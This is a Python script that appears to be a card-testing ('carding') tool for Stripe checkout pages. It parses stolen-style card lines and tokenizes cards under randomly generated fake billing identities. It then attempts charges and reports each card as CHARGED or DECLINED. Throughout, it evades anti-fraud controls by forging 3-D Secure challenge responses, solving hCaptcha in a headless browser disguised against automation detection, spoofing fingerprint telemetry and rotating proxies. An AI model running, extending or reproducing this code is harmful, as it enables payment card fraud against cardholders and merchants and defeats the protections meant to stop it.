#!/usr/bin/env python3
import os, re, sys, json, time, uuid, hmac, base64, random, hashlib, asyncio, secrets, traceback
import urllib.parse
from urllib.parse import unquote, urlencode, urljoin, urlparse
from datetime import datetime
import zipfile, tempfile, shutil

try:
    from curl_cffi.requests import AsyncSession
    import nodriver as uc
except ImportError:
    print("pip install curl-cffi nodriver websockets>=14 --break-system-packages"); sys.exit(1)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
SJUA = "stripe.js/da394b0aef; stripe-js-v3/da394b0aef; checkout"
STRIPE_VER = "2020-08-27"
HCK = "c7faac4c-1cd7-4b1b-b2d4-42ba98d09c7a"
NKEY = ""

class C:
    R="\033[0m";B="\033[1m";RED="\033[91m";GRN="\033[92m";YEL="\033[93m"
    CYN="\033[96m";LIME="\033[38;5;118m";GOLD="\033[38;5;214m"

def log(t, color=C.CYN):
    print(f"{color}[{datetime.now().strftime('%H:%M:%S')}] {t}{C.R}")

def decode_fid(u):
    if not u: return {}
    raw = str(u).strip(); cs = None
    m = re.search(r"(cs_(?:live|test)_[A-Za-z0-9]+)", raw)
    if m: cs = m.group(1)
    if "#" in raw: raw = raw.split("#", 1)[1]
    raw = raw.split("?", 1)[0]
    if "_secret_" in raw:
        l, r = raw.split("_secret_", 1)
        if not cs and l.startswith("cs_"): cs = l
        raw = r
    u = unquote(raw).strip().rstrip("%")
    if not u: return {}
    pad = u + "=" * (-len(u) % 4)
    try: d = base64.b64decode(pad, altchars=b"-_")
    except:
        try: d = base64.b64decode(pad)
        except: return {}
    x = bytes(b ^ 5 for b in d).decode("utf-8", errors="replace").strip()
    try: data = json.loads(x)
    except: return {}
    if cs and isinstance(data, dict): data.setdefault("checkoutSessionId", cs)
    return data if isinstance(data, dict) else {}

def extract_cs_pk(url):
    cs = pk = acct = None
    m = re.search(r'(cs_(?:live|test)_[A-Za-z0-9]{20,})', url)
    if m: cs = m.group(1)
    fid = decode_fid(url)
    if fid:
        pk = fid.get("apiKey") or fid.get("publishableKey")
        acct = fid.get("stripeAccount")
        cs = cs or fid.get("checkoutSessionId")
    return cs, pk, acct

def b64e(b): return base64.b64encode(b).decode().rstrip("=").replace("+","-").replace("/","_")
def b64d(s):
    s = s.replace("-","+").replace("_","/"); s += "="*(-len(s)%4)
    return base64.b64decode(s)

def gen_cavv(a, d, t):
    r = f"{a}:{d}:{t}:{int(time.time())}".encode()
    return b64e(hmac.new(secrets.token_bytes(32), r, hashlib.sha256).digest()[:20])

def eci_for(pan):
    p = (pan or "").replace(" ", "")
    if p.startswith(("34","37")): return "05"
    if p.startswith(("51","52","53","54","55","2")): return "02"
    return "05"

def forge_cres(a, s, pan="", ts="Y"):
    return {"threeDSServerTransID": s, "acsTransID": a, "dsTransID": s,
            "messageType": "CRes", "messageVersion": "2.2.0", "transStatus": ts,
            "authenticationValue": gen_cavv(a, s, s), "eci": eci_for(pan),
            "challengeCompletionInd": "Y",
            "acsRenderingType": {"acsInterface": "01", "acsUiTemplate": "01"}}

def is_challenge(h):
    lo = h.lower()
    mk = ("challengeinfo","verification code","one time password","challengevar",
          '"transstatus":"c"',"transstatus='c'",'name="challengedata"',
          'id="challengeframe"',"acs-challenge")
    if any(k in lo for k in mk): return True
    return bool(re.search(r'name=["\'](?:otp|passcode|challenge_code|sms_code)["\']', h, re.I))

def is_param_error(msg):
    m = (msg or "").lower()
    return ("unknown parameter" in m or "parameter_unknown" in m
            or "received unknown" in m or "did you mean" in m)

def _create_proxy_auth_folder(host, port, user, pw):
    ext_dir = os.path.join(tempfile.gettempdir(), f"pxauth_{host}_{port}")
    os.makedirs(ext_dir, exist_ok=True)

    manifest_json = ('{"version": "1.0.0", "manifest_version": 2, '
        '"name": "Chrome Proxy", '
        '"permissions": ["proxy","tabs","unlimitedStorage","storage","<all_urls>","webRequest","webRequestBlocking"], '
        '"background": {"scripts": ["background.js"]}, "minimum_chrome_version":"22.0.0"}')

    background_js = '''
    var config = {
      mode: "fixed_servers",
      rules: {
        singleProxy: { scheme: "http", host: "%s", port: parseInt(%s) },
        bypassList: ["localhost"]
      }
    };
    chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});
    function callbackFn(details) {
      return { authCredentials: { username: "%s", password: "%s" } };
    }
    chrome.webRequest.onAuthRequired.addListener(
      callbackFn, {urls: ["<all_urls>"]}, ['blocking']
    );
    ''' % (host, port, user, pw)

    with open(os.path.join(ext_dir, "manifest.json"), "w") as f:
        f.write(manifest_json)
    with open(os.path.join(ext_dir, "background.js"), "w") as f:
        f.write(background_js)

    return ext_dir

async def _start_browser_with_retry(proxy_entry, browser_args):
    last_err = None
    for attempt in range(1, 4):
        try:
            log(f"[nodriver] starting browser (attempt {attempt}/3)...", C.YEL)
            browser = await uc.start(
                browser_executable_path='/usr/bin/chromium-browser',
                browser_args=browser_args,
                sandbox=False,
            )
            log("[nodriver] browser connected successfully!", C.LIME)
            return browser
        except Exception as e:
            last_err = e
            log(f"[nodriver] attempt {attempt} failed: {str(e)[:80]}", C.RED)
            await asyncio.sleep(3)
    raise last_err

async def _run_nodriver_hcaptcha(checkout_url, proxy_entry=None, rqdata=None, sitekey=None):
    if not sitekey:
        log("[nodriver] missing sitekey — cannot solve", C.RED)
        return None

    browser_args = [
        "--headless=new", "--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
        "--disable-blink-features=AutomationControlled", "--window-size=1920,1080",
        "--lang=en-US", "--remote-debugging-port=9222", "--disable-extensions",
        "--disable-background-networking", "--disable-default-apps", "--disable-sync",
        "--metrics-recording-only", "--mute-audio", "--no-first-run",
    ]

    ext_dir = None
    if proxy_entry:
        parsed = urlparse(proxy_entry["url"])
        if proxy_entry.get("auth"):
            ext_dir = _create_proxy_auth_folder(
                parsed.hostname, parsed.port,
                proxy_entry["auth"][0], proxy_entry["auth"][1]
            )
            browser_args.append(f"--load-extension={ext_dir}")
            browser_args.append(f"--disable-extensions-except={ext_dir}")
        else:
            browser_args.append(f"--proxy-server={proxy_entry['url']}")

    browser = None
    try:
        browser = await _start_browser_with_retry(proxy_entry, browser_args)
        page = await browser.get(checkout_url)
        await page.sleep(2)

        rq_safe = (rqdata or "").replace("\\", "\\\\").replace("'", "\\'")
        sk_safe = sitekey.replace("'", "\\'")

        js = f"""
        (async () => {{
            function waitFor(condition, timeout, interval) {{
                return new Promise((resolve, reject) => {{
                    const start = Date.now();
                    const check = () => {{
                        try {{
                            if (condition()) return resolve(true);
                        }} catch(e) {{}}
                        if (Date.now() - start > timeout) return reject('timeout');
                        setTimeout(check, interval);
                    }};
                    check();
                }});
            }}

            // 1. استنى Stripe يحمل الكابتشا بنفسه (عشان نتغلب على حماية CSP)
            try {{
                await waitFor(() => typeof hcaptcha !== 'undefined' && hcaptcha.render, 10000, 500);
            }} catch(e) {{
                // 2. لو ملقاهوش، حاول انت تحمله
                try {{
                    await new Promise((res, rej) => {{
                        const s = document.createElement('script');
                        s.src = 'https://js.hcaptcha.com/1/api.js?render=explicit';
                        s.onload = res;
                        s.onerror = () => rej('CSP_blocked_or_network_error');
                        document.head.appendChild(s);
                    }});
                    await waitFor(() => typeof hcaptcha !== 'undefined' && hcaptcha.render, 5000, 500);
                }} catch(e2) {{
                    return 'err_loading_hcaptcha: ' + (e2.message || e2.toString());
                }}
            }}

            // 3. لو فيه توكن قديم موجود
            try {{
                let existing = hcaptcha.getResponse();
                if (existing && existing.length > 20) return existing;
            }} catch(e) {{}}

            // 4. اعمل render ونفذ
            return await new Promise((resolve, reject) => {{
                const holder = document.createElement('div');
                holder.id = '__hc_holder_' + Date.now();
                document.body.appendChild(holder);
                let done = false;
                const t = setTimeout(() => {{ if (!done) {{ done = true; reject('execution_timeout_20s'); }} }}, 20000);
                
                try {{
                    const wid = hcaptcha.render(holder, {{
                        sitekey: '{sk_safe}',
                        size: 'invisible',
                        rqdata: '{rq_safe}',
                        callback: (tok) => {{ if (done) return; done = true; clearTimeout(t); resolve(tok); }},
                        'error-callback': (e) => {{ if (done) return; done = true; clearTimeout(t); reject('hcaptcha_error_callback: ' + e); }}
                    }});
                    
                    hcaptcha.execute(wid, {{rqdata: '{rq_safe}'}}).catch(e => {{
                        if (!done) {{ done = true; clearTimeout(t); reject('execute_rejection: ' + (e.message || e.toString())); }}
                    }});
                }} catch(e) {{
                    if (!done) {{ done = true; clearTimeout(t); reject('render_sync_error: ' + (e.message || e.toString())); }}
                }}
            }});
        }})()
        """

        token = await page.evaluate(js, await_promise=True, return_by_value=True)

        if token and isinstance(token, str) and len(token) > 20 and not token.startswith("err_"):
            log(f"[nodriver] token OK ({len(token)} chars)", C.LIME)
            return token
        log(f"[nodriver] token invalid: {str(token)}", C.RED)
        return None
    except Exception as e:
        log(f"[nodriver] EXC: {str(e)}", C.RED)
        log(f"[nodriver] TRACEBACK: {traceback.format_exc()[:300]}", C.RED)
        return None
    finally:
        try:
            if browser: browser.stop()
        except Exception: pass
        try: os.system("pkill -9 -f chromium > /dev/null 2>&1")
        except Exception: pass
        try: os.system("pkill -9 -f chrome > /dev/null 2>&1")
        except Exception: pass
        if ext_dir and os.path.exists(ext_dir):
            try: shutil.rmtree(ext_dir, ignore_errors=True)
            except Exception: pass

async def solve_hcaptcha_selenium(checkout_url, proxy_entry=None, rqdata=None, sitekey=None):
    return await _run_nodriver_hcaptcha(checkout_url, proxy_entry, rqdata, sitekey)

async def solve_hcaptcha(sk, pg, rq, max_attempts=2): return None

_SRC_PREFIXES = ("src_", "tdsrc_", "pi_3ds_")
def _is_src(v): return isinstance(v, str) and any(v.startswith(p) for p in _SRC_PREFIXES)

def find_source_recursive(obj, depth=0, max_depth=12):
    if depth > max_depth: return None
    if isinstance(obj, str): return obj if _is_src(obj) else None
    if isinstance(obj, dict):
        for k in ("source", "three_d_secure_2_source", "three_ds_2_source", "sourceId", "source_id", "id"):
            if k in obj:
                v = obj[k]
                if _is_src(v): return v
                if isinstance(v, dict) and _is_src(v.get("id")): return v["id"]
        for v in obj.values():
            r = find_source_recursive(v, depth + 1, max_depth)
            if r: return r
    if isinstance(obj, list):
        for item in obj:
            r = find_source_recursive(item, depth + 1, max_depth)
            if r: return r
    return None

class StripeSession:
    def __init__(self, url, proxy_entry=None):
        self.url = url.strip()
        self._proxy = proxy_entry
        self.pk = ""; self.cs = ""; self.acct = None
        self.merchant = "Stripe"; self.amount_str = "N/A"; self.raw_amount = 0
        self.session = None; self.email = ""
        self.init_json = {}; self.hcaptcha_sitekey = HCK
        self.tracking = {"muid": str(uuid.uuid4()), "sid": str(uuid.uuid4()), "guid": str(uuid.uuid4())}
        self._current_card = None; self._current_pm_id = None

    def _proxy_kwargs(self):
        if not self._proxy: return {}
        kw = {}; url = self._proxy["url"]; auth = self._proxy.get("auth")
        if auth and isinstance(auth, (tuple, list)) and len(auth) == 2:
            url = url.replace("http://", f"http://{auth[0]}:{auth[1]}@")
        kw["proxy"] = url
        return kw

    def _hdrs(self, ref=None):
        h = {
            "accept": "application/json", "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://checkout.stripe.com",
            "referer": ref or f"https://checkout.stripe.com/c/pay/{self.cs}",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
            "user-agent": UA, "stripe-version": STRIPE_VER, "x-stripe-userdata": "{}",
        }
        if self.acct: h["stripe-account"] = self.acct
        return h

    async def prefetch(self):
        fid = decode_fid(self.url)
        self.cs = fid.get("checkoutSessionId") or ""
        self.pk = fid.get("apiKey") or ""
        self.acct = fid.get("stripeAccount")
        if not self.cs:
            m = re.search(r"cs_(?:live|test)_[A-Za-z0-9]+", self.url)
            if m: self.cs = m.group(0)
        if not self.pk or not self.cs: return False, "missing cs/pk"
        
        if self.session: await self.session.close()
        self.session = AsyncSession(impersonate="chrome", **self._proxy_kwargs())
        
        try:
            await self.session.get(f"https://checkout.stripe.com/c/pay/{self.cs}",
                headers={**self._hdrs(), "accept": "text/html,*/*"})
        except: pass
        
        async def do_telemetry():
            try:
                tel = {"v":2,"tag":"5.6.8_js_fp","src":"checkout-inner-live-v3","a":{
                    "a": self.pk, "b": f"https://checkout.stripe.com/c/pay/{self.cs}",
                    "c": 24, "d": "1920x1080", "e": False, "f": "en-US", "g": "Win32",
                    "h": UA, "i": -300, "j": False, "k": 8, "l": 8}}
                r = await self.session.post("https://m.stripe.com/6", json=tel,
                    headers={"content-type":"application/json","origin":"https://js.stripe.com",
                             "referer":"https://js.stripe.com/","user-agent":UA})
                if r.status_code == 200:
                    j = r.json()
                    for k in ("muid","sid","guid"):
                        if j.get(k): self.tracking[k] = j[k]
            except: pass
        
        async def do_init():
            try:
                body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
                r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                    headers=self._hdrs(), data=body)
                return r.json()
            except Exception as e: return {"_err": str(e)[:80]}
        
        tel_task = asyncio.create_task(do_telemetry())
        init_task = asyncio.create_task(do_init())
        _, j = await asyncio.gather(tel_task, init_task, return_exceptions=True)
        
        if not isinstance(j, dict) or "_err" in j:
            return False, j.get("_err", "init failed") if isinstance(j, dict) else "init failed"
        if "error" in j:
            e = j["error"]; return False, f"{e.get('code')}: {e.get('message')}"
        
        ac = j.get("account_settings") or {}
        self.merchant = ac.get("display_name") or ac.get("business_name") or "Stripe Merchant"
        cu = j.get("customer") or {}; self.email = cu.get("email") or j.get("customer_email") or ""
        ts = j.get("total_summary") or {}; inv = j.get("invoice") or {}
        lig = j.get("line_item_group") or {}; pi = j.get("payment_intent") or {}
        self.raw_amount = (ts.get("due") or ts.get("total") or inv.get("amount_due")
                          or inv.get("total") or lig.get("total") or pi.get("amount") or 0)
        curr = (j.get("currency") or "usd").upper()
        self.amount_str = f"{self.raw_amount/100:.2f} {curr}" if self.raw_amount else "N/A"
        self.init_json = j
        
        try:
            passive = j.get("passive_captcha") or {}
            if not passive and isinstance(j.get("account_settings"), dict):
                passive = j["account_settings"].get("passive_captcha") or {}
            sk = (passive.get("site_key") or passive.get("sitekey") or passive.get("key") or j.get("captcha_site_key"))
            if sk and isinstance(sk, str) and len(sk) > 10:
                self.hcaptcha_sitekey = sk
        except Exception: pass
        return True, None

    async def _tokenize(self, card):
        name = random.choice(["James Smith","John Doe","Alex Turner","Michael Brown"])
        email = self.email or f"user{random.randint(1000,99999)}@gmail.com"
        data = {
            "type": "card", "card[number]": card["cc"], "card[cvc]": card["cvv"],
            "card[exp_month]": card["mm"], "card[exp_year]": card["yy"],
            "billing_details[name]": name, "billing_details[email]": email,
            "billing_details[address][country]": "US", "billing_details[address][line1]": f"{random.randint(100,9999)} Main St",
            "billing_details[address][city]": "New York", "billing_details[address][postal_code]": "10001",
            "billing_details[address][state]": "NY", "payment_user_agent": SJUA,
            "time_on_page": str(random.randint(45000, 120000)),
            "guid": self.tracking["guid"], "muid": self.tracking["muid"],
            "sid": self.tracking["sid"], "key": self.pk,
        }
        if self.cs and self.cs.startswith("cs_"):
            data["client_attribution_metadata[client_session_id]"] = self.cs
            data["client_attribution_metadata[merchant_integration_source]"] = "checkout"
            data["client_attribution_metadata[merchant_integration_version]"] = "hosted_checkout"
            data["client_attribution_metadata[payment_method_selection_flow]"] = "automatic"
        try:
            r = await self.session.post("https://api.stripe.com/v1/payment_methods", data=data, headers=self._hdrs())
            j = r.json()
            if "error" in j:
                e = j["error"]; return None, (e.get("decline_code") or e.get("code") or "token_failed"), e.get("message", "")
            return j.get("id"), None, None
        except Exception as e: return None, "net", str(e)[:80]

    async def _confirm_variants(self, pm_id):
        total = self.raw_amount; checksum = self.init_json.get("init_checksum", ""); config_id = self.init_json.get("config_id", "")
        common = {
            "payment_method": pm_id, "expected_payment_method_type": "card",
            "return_url": f"https://checkout.stripe.com/c/pay/{self.cs}", "key": self.pk,
            "client_attribution_metadata[client_session_id]": self.cs,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "muid": self.tracking["muid"], "sid": self.tracking["sid"], "guid": self.tracking["guid"],
        }
        if config_id: common["client_attribution_metadata[checkout_config_id]"] = config_id
        if total > 0:
            common["expected_amount"] = total
            common["last_displayed_line_item_group_details[subtotal]"] = total
            common["last_displayed_line_item_group_details[total_exclusive_tax]"] = 0
            common["last_displayed_line_item_group_details[total_inclusive_tax]"] = 0
            common["last_displayed_line_item_group_details[total_discount_amount]"] = 0
            common["last_displayed_line_item_group_details[shipping_rate_amount]"] = 0
        
        variants = []
        v = dict(common); v["eid"] = "NA"
        if checksum: v["init_checksum"] = checksum
        variants.append(("V1_NA_checksum", v))
        v = dict(common); v["eid"] = "NA"; variants.append(("V2_NA_nochecksum", v))
        v = dict(common); v["eid"] = str(uuid.uuid4())
        if checksum: v["init_checksum"] = checksum
        variants.append(("V3_UUID_checksum", v))
        
        last_err = None
        for label, data in variants:
            try:
                r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", data=data, headers=self._hdrs(), timeout=15)
                j = r.json()
                if "error" not in j: return j, label
                msg = j["error"].get("message", "")
                if is_param_error(msg): last_err = j; continue
                if "confirming the Checkout Session" not in msg: return j, label
                last_err = j
            except Exception as e: last_err = {"error": {"message": str(e)[:80]}}
        return last_err or {"error": {"message": "all failed"}}, "ALL_FAILED"

    async def _authenticate_source(self, source, client_secret):
        data = {
            "key": self.pk, "source": source, "client_secret": client_secret,
            "payment_user_agent": SJUA, "one_click_authn": "false", "challenge_window_size": "05",
            "three_d_secure_2[device_render_options][sdk_interface]": "03",
            "three_d_secure_2[device_render_options][sdk_ui_type][0]": "01",
            "three_d_secure_2[three_ds_comp_ind]": "Y", "browser[fingerprintAttempted]": "true",
            "browser[challengeWindowSize]": "05", "browser[threeDSCompInd]": "Y",
            "browser[browserJavaEnabled]": "false", "browser[browserJavascriptEnabled]": "true",
            "browser[browserLanguage]": "en-US", "browser[browserColorDepth]": "24",
            "browser[browserScreenHeight]": "1080", "browser[browserScreenWidth]": "1920",
            "browser[browserTZ]": "-300", "browser[browserUserAgent]": UA,
            "browser[browserAcceptHeader]": "text/html,*/*;q=0.8",
        }
        hdr = {"accept":"application/json","content-type":"application/x-www-form-urlencoded",
               "origin":"https://js.stripe.com","referer":"https://js.stripe.com/",
               "user-agent":UA,"stripe-version":STRIPE_VER}
        try:
            r = await self.session.post("https://api.stripe.com/v1/3ds2/authenticate", data=data, headers=hdr, timeout=15)
            return r.json()
        except Exception as e: return {"error": {"message": str(e)[:80]}}

    async def _verify_challenge(self, pi_id, client_secret, token=""):
        endpoint = "setup_intents" if pi_id.startswith("seti_") else "payment_intents"
        data = {"key": self.pk, "client_secret": client_secret}
        if token: data["captcha_response"] = token
        try:
            r = await self.session.post(f"https://api.stripe.com/v1/{endpoint}/{pi_id}/verify_challenge", data=data, headers=self._hdrs(), timeout=15)
            return r.json()
        except Exception as e: return {"error": {"message": str(e)[:80]}}

    async def _handle_waf(self, conf, pi):
        na = pi.get("next_action") or conf.get("next_action") or {}
        use_sdk = na.get("use_stripe_sdk") or {}; sjs = use_sdk.get("stripe_js") or {}
        pi_id = pi.get("id"); cs_secret = pi.get("client_secret")
        
        rqdata = (sjs.get("rqdata") or conf.get("rqdata") or (pi.get("next_action", {}).get("use_stripe_sdk", {}).get("stripe_js", {}).get("rqdata")))
        site_key = (sjs.get("site_key") or sjs.get("captcha_site_key") or getattr(self, "hcaptcha_sitekey", HCK) or HCK)
        source = find_source_recursive(conf) or find_source_recursive(pi) or find_source_recursive(use_sdk)
        
        log(f"WAF -> source={bool(source)} rq={bool(rqdata)}", C.GOLD)
        
        if source:
            log("S1: authenticate", C.LIME)
            r = await self._authenticate_source(source, cs_secret)
            st = r.get("status") or r.get("state", "") if isinstance(r, dict) else ""
            if st in ("succeeded","requires_capture","complete"):
                return {"success": True, "status": "CHARGED", "message": f"Source ({st})", "raw": r}
        
        if pi_id and cs_secret:
            log("S2: verify no-token", C.GOLD)
            r = await self._verify_challenge(pi_id, cs_secret, "")
            if isinstance(r, dict):
                vpi = r.get("payment_intent") or r.get("setup_intent") or r
                st = vpi.get("status", "") if isinstance(vpi, dict) else ""
                if st in ("succeeded","requires_capture","complete"):
                    return {"success": True, "status": "CHARGED", "message": f"Verify ({st})", "raw": r}
        
        if self.cs:
            log("S4: Nodriver Local Browser", C.GOLD)
            checkout_url = f"https://checkout.stripe.com/c/pay/{self.cs}"
            token = await solve_hcaptcha_selenium(checkout_url, self._proxy, rqdata, site_key)
            if token:
                log("  Got hCaptcha token! Verifying...", C.LIME)
                r = await self._verify_challenge(pi_id, cs_secret, token)
                if isinstance(r, dict):
                    vpi = r.get("payment_intent") or r.get("setup_intent") or r
                    st = vpi.get("status", "") if isinstance(vpi, dict) else ""
                    if st in ("succeeded","requires_capture","complete"):
                        return {"success": True, "status": "CHARGED", "message": f"Nodriver ({st})", "raw": r}
        return {"success": False, "status": "CAPTCHA_FAIL", "message": "WAF unrecoverable"}

    async def _handle_3ds(self, conf, pi, source):
        if not isinstance(pi, dict): pi = {}
        na = pi.get("next_action") or conf.get("next_action") or {}
        sdk = na.get("use_stripe_sdk") or na
        pi_id = pi.get("id") or (conf.get("payment_intent") or {}).get("id")
        cs_secret = pi.get("client_secret") or conf.get("client_secret")
        stid = sdk.get("three_ds_server_trans_id") or sdk.get("server_transaction_id")
        method_url = sdk.get("three_ds_method_url")
        notify_url = sdk.get("three_ds_method_notification_url") or "https://hooks.stripe.com/3ds2/fingerprint/complete"
        if method_url and stid:
            log("3DS: fingerprint", C.CYN)
            pl = {"threeDSServerTransID": stid, "threeDSMethodNotificationURL": notify_url}
            mb = b64e(json.dumps(pl, separators=(",",":")).encode())
            try:
                await self.session.post(method_url, data=urlencode({"threeDSMethodData": mb}),
                    headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA})
            except: pass
            await asyncio.sleep(0.8)
        src = source or find_source_recursive(sdk) or find_source_recursive(conf)
        if src:
            log("3DS: authenticate", C.CYN)
            result = await self._authenticate_source(src, cs_secret)
            if isinstance(result, dict):
                st = result.get("status") or result.get("state", "")
                if st in ("succeeded","requires_capture"):
                    return {"success": True, "status": "CHARGED", "message": "3DS OK", "raw": result}
        return {"success": False, "status": "3DS_OTP", "message": "OTP required"}
    
    async def charge(self, card):
        res = {"card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}", "status": "ERROR", "message": "", "response_time": 0, "success": False, "merchant": self.merchant, "amount": self.amount_str}
        t0 = time.time(); self._current_card = card
        try:
            pm_id, code, msg = await self._tokenize(card)
            if not pm_id:
                if code in ("resource_missing","checkout_session_expired"):
                    res["status"] = "SESSION_EXPIRED"; res["message"] = f"{code}: {msg}"
                else:
                    res["status"] = "DECLINED"; res["message"] = f"{(code or '').upper()}: {msg}".strip(": ")
                res["response_time"] = time.time() - t0; return res
            
            self._current_pm_id = pm_id
            conf, variant = await self._confirm_variants(pm_id)
            res["variant"] = variant; res["response_time"] = time.time() - t0
            
            err = conf.get("error") or {}
            if err:
                code = err.get("decline_code") or err.get("code") or ""
                msg = err.get("message", "")
                if code in ("resource_missing","checkout_session_expired"):
                    res["status"] = "SESSION_EXPIRED"; res["message"] = f"{code}: {msg}"; return res
                res["status"] = "DECLINED"; res["message"] = f"{code.upper()}: {msg}".strip(": "); return res
            
            pi = conf.get("payment_intent") or conf.get("setup_intent") or conf
            st = pi.get("status") or conf.get("status") or ""
            if st in ("succeeded","requires_capture","complete") or conf.get("payment_status") == "paid":
                res["status"] = "CHARGED"; res["message"] = "Success"; res["success"] = True; return res
            
            if st == "requires_action":
                na = pi.get("next_action") or {}
                use_sdk = na.get("use_stripe_sdk") or {}
                sdk_type = (use_sdk.get("type") or na.get("type") or "").lower()
                sjs = use_sdk.get("stripe_js") or {}
                is_waf = ("intent_confirmation_challenge" in sdk_type or "captcha" in sdk_type or bool(sjs.get("rqdata")))
                if is_waf:
                    waf = await self._handle_waf(conf, pi)
                    res["status"] = waf.get("status","CAPTCHA_FAIL"); res["message"] = waf.get("message",""); res["success"] = waf.get("success", False)
                    return res
                three = await self._handle_3ds(conf, pi, None)
                res["status"] = three.get("status","3DS"); res["message"] = three.get("message",""); res["success"] = three.get("success", False)
                return res
            res["status"] = st.upper() if st else "UNKNOWN"
            return res
        except Exception as e:
            res["message"] = f"{type(e).__name__}: {str(e)[:60]}"; res["response_time"] = time.time() - t0; return res
    
    async def close(self):
        if self.session: await self.session.close()

def parse_card(line):
    p = re.split(r'[|/\s,]+', line.strip())
    if len(p) < 4: return None
    cc = re.sub(r'\D', '', p[0])
    if not (13 <= len(cc) <= 19): return None
    try: mm = p[1].strip().zfill(2); _ = int(mm)
    except: return None
    if not (1 <= int(mm) <= 12): return None
    yy = p[2].strip()
    if len(yy) == 2: yy = "20" + yy
    if not (yy.isdigit() and len(yy) == 4): return None
    cvv = re.sub(r'\D', '', p[3])
    if len(cvv) not in (3, 4): return None
    return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
